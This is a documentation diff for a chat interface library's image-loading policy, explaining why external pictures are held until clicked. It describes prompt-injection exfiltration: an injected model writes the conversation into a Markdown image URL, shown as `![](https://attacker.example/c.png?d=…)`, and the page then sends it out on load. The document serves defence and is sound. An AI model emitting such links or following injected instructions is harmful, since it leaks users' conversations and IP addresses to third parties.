@@ -165,13 +165,18 @@ Pictures a model or a tool chose do not load by themselves. A `data:` or `blob:`
 any other is shown as a small link that names where it would load from, and it loads in place when
 the reader clicks it (a click with a modifier key or the middle button is left to the browser, as
 for any link: a new tab, a new window or a download). A card shows one "Show images" button in
-place of the links. Nothing is fetched while a reply streams.
+place of the links. A held picture is not fetched while a reply streams either.
 
-A picture fetches its address the moment it is shown, and a prompt-injected model can write the
-conversation into that address: `![](https://attacker.example/c.png?d=…)` sends it, with the
-reader's IP address, to that host without a click. The page's own address is not trusted by
+A picture fetches its address the moment it is shown, and a prompt-injected model — one that read
+a web page, a document or a tool result written to steer it — can write the conversation into that
+address: `![](https://attacker.example/c.png?d=…)` sends it, with the reader's IP address, to that
+host without a click, and nobody sees anything happen. The page's own address is not trusted by
 default either. It carries the reader's cookies, and an open redirect on your site turns a picture
 from your site into a picture from anywhere.
+
+The assistants this was done to closed it the same way: Gemini no longer shows external pictures in
+a reply, ChatGPT loads only addresses it has checked, and GitHub Copilot Chat stopped showing them,
+each after the attack was reported.
 
 Name what you trust with `setImagePolicy`:
 
@@ -188,6 +193,20 @@ aparteGlobalConfig.setImagePolicy(['*']);
 aparteGlobalConfig.setImagePolicy((url) =>
   url.startsWith('https://images.example.com/') ? 'load' : 'hold');
 ```
+
+Which one to choose:
+
+- **Your pictures come from places you know** — your site, a CDN, a product catalogue: list them.
+  List hosts that serve only your own files: one where anyone can upload, or that redirects
+  anywhere, gives the hole back.
+- **Every picture should load** — an internal tool whose model never reads content you do not
+  control: `['*']`, as 0.x did.
+- **No picture should load by itself** — keep the default. `setImagePolicy([])` says so, and
+  silences the note below.
+
+The first picture held on a page also writes a note in the browser console, with its host and the
+line to add, so a picture waiting for a click is not mistaken for a broken one. Naming any policy,
+the default included, silences it.
 
 A list takes `'self'`, `'*'` and origins; a function gets the address resolved against the page.
 An answer that is none of the three holds the picture. Every picture that loads goes with
